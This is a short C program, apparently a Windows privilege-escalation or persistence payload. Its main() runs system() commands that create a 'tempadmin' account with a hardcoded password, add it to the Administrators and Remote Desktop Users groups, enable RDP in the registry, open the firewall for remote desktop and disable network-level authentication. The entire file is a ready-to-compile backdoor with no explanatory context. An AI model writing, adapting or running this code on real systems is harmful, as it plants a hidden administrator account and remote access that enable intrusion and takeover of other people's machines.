#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user /add tempadmin password123!@#");
  i = system ("net localgroup administrators tempadmin /add");
  i = system ("net localgroup \"Remote Desktop Users\" tempadmin /add");
  i = system ("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
  i = system ("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes");
  i = system ("wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where \"TerminalName='RDP-Tcp'\" call SetUserAuthenticationRequired 0");
  
  return 0;
}
